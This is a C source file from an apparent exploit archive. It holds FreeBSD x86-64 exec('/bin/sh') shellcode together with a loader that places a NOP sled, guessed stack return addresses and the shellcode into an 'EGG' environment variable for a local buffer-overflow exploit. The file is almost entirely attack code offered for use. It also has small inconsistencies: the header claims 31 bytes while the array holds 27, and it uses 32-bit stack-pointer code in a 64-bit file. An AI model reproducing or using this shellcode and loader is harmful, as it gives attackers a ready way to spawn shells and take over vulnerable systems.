/**
 *           [ http://www.hacknroll.com ]
 *
 * Description:
 *    FreeBSD x86-64 exec("/bin/sh") Shellcode - 31 bytes
 *
 * Authors:
 *    Maycon M. Vitali ( 0ut0fBound )
 *        Milw0rm .: http://www.milw0rm.com/author/869
 *        Page ....: http://maycon.hacknroll.com
 *        Email ...: maycon@hacknroll.com
 *
 *    Anderson Eduardo ( c0d3_z3r0 )
 *        Milw0rm .: http://www.milw0rm.com/author/1570
 *        Page ....: http://anderson.hacknroll.com
 *        Email ...: anderson@hacknroll.com
 * 
 * -------------------------------------------------------
 *   
 * amd64# gcc hacknroll.c -o hacknroll
 * amd64# ./hacknroll
 * # exit
 * amd64#
 *
 * -------------------------------------------------------
 */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define NOP                            0x90

const char shellcode[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
    buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"EGG=",4);
  putenv(buff);
  system("/bin/bash");
}

